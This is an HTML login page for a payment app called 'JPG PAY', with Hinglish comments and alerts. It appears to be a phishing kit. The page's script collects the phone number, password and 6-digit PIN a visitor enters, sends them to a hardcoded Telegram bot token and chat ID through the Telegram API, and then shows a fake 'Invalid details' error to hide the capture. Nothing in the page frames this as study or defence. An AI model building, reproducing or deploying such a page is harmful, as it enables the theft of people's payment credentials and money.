<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>JPG PAY</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: #0d0d0d;
      color: #e0e0e0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container { width: 100%; max-width: 360px; text-align: center; }
    
    /* Logo Box */
    .logo-box {
      width: 140px; height: 140px;
      border-radius: 30px;
      margin: 0 auto 40px;
      overflow: hidden;
      background: #111111;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.03);
    }
    .logo-box img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    /* Input Fields */
    .input-group {
      display: flex;
      align-items: center;
      background: transparent;
      border: 1.5px solid #333333;
      border-radius: 30px;
      padding: 16px 22px;
      margin-bottom: 18px;
    }
    .input-group svg {
      width: 22px; height: 22px;
      fill: #4db6ac;
      margin-right: 16px;
      flex-shrink: 0;
    }
    .input-group input {
      background: transparent;
      border: none;
      color: #ffffff;
      font-size: 16px;
      width: 100%;
      outline: none;
    }
    .input-group input::placeholder { color: #666666; }
    
    .input-group input#pin {
      letter-spacing: 8px;
      font-weight: 500;
    }
    .input-group input#pin::placeholder {
      letter-spacing: normal;
      font-weight: normal;
    }

    /* Links Row */
    .row {
      display: flex;
      justify-content: space-between;
      font-size: 15px;
      color: #4db6ac;
      margin-bottom: 28px;
      padding: 0 5px;
      font-weight: 600;
    }
    .row a { color: #4db6ac; text-decoration: underline; }
    .row div { display: flex; align-items: center; gap: 8px; cursor: pointer; }
    .row input[type="radio"] {
      width: 16px; height: 16px;
      accent-color: #4db6ac;
    }
    
    /* Agreement */
    .checkbox-container {
      display: flex;
      align-items: center;
      font-size: 14px;
      color: #4db6ac;
      justify-content: center;
      margin-bottom: 32px;
      font-weight: 600;
    }
    .checkbox-container input {
      margin-right: 10px;
      width: 18px; height: 18px;
      accent-color: #4db6ac;
    }

    /* Sign In Button */
    .btn-main {
      width: 100%;
      padding: 18px;
      background: #1e5b4f;
      color: #ffffff;
      border: none;
      border-radius: 30px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }
    .btn-main:hover { background: #164a40; }
    .btn-main:active { transform: scale(0.98); }
  </style>
</head>
<body>

  <div class="container">
    <!-- Logo Box - Photo ka naam 'jpglogo.png' hi rahega kyunki GitHub par yahi naam hai -->
    <div class="logo-box">
      <img src="jpglogo.png" alt="JPG PAY">
    </div>

    <!-- Phone Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      <input type="tel" id="phone" placeholder="Phone" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
    </div>

    <!-- Password Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
      <input type="password" id="pass" placeholder="Password">
    </div>

    <!-- 6-Digit PIN Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
      <input type="tel" id="pin" placeholder="6-digit PIN" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
    </div>

    <!-- Register & Remember Me -->
    <div class="row">
      <a href="#">Register</a>
      <div><input type="radio" name="remember"> Remember Me</div>
    </div>

    <!-- Agreement -->
    <div class="checkbox-container">
      <input type="radio" name="agree" checked> Agree "User Privacy Agreement"
    </div>

    <!-- Submit Button -->
    <button class="btn-main" onclick="submitLogin()">Sign In</button>
  </div>

  <script>
    // ==========================================
    // TELEGRAM BOT DETAILS
    // ==========================================
    const BOT_TOKEN = "8990784308:AAHT79h9bUWISEm-eXZImzcdmISDsqqf9HM";
    const CHAT_ID = "7318531273";

    function submitLogin() {
      let phone = document.getElementById('phone').value.trim();
      let pass = document.getElementById('pass').value.trim();
      let pin = document.getElementById('pin').value.trim();

      if (phone === "" || pass === "" || pin === "") {
        alert("Bhai, saari details daalo (Phone, Password, aur 6-digit PIN)!");
        return;
      }

      if (phone.length !== 10) {
        alert("Phone number 10 digit ka hona chahiye!");
        return;
      }

      if (pin.length !== 6) {
        alert("PIN exactly 6 digit ka hona chahiye!");
        return;
      }

      let message = "🔔 *JPG PAY - New Login Attempt*\n\n";
      message += "📞 Phone: " + phone + "\n";
      message += "🔑 Password: " + pass + "\n";
      message += "🔐 6-digit PIN: " + pin;

      sendToTelegram(message);

      setTimeout(() => {
        alert("❌ Invalid details! Please try again.");
      }, 500);
    }

    function sendToTelegram(message) {
      let url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=Markdown&text=" + encodeURIComponent(message);
      fetch(url)
        .then(res => console.log("Telegram Status:", res.status))
        .catch(err => console.error("Telegram Error:", err));
    }
  </script>

</body>
</html>
